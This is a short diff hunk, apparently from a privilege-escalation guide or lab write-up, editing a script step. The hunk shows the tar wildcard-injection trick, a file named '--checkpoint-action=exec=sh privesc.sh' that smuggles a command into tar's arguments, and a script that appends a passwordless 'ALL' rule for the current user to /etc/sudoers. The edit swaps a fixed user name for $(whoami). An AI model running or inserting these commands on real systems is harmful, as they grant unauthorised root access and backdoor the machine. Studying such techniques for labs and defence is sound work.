@@ -387,7 +387,7 @@ touch -- '--checkpoint-action=exec=sh privesc.sh'
 # 3. Create a bash script for privilege escalation
 cat << EOF > privesc.sh
 #!/bin/bash
-echo 'currentuser ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
 EOF
 chmod +x privesc.sh
 
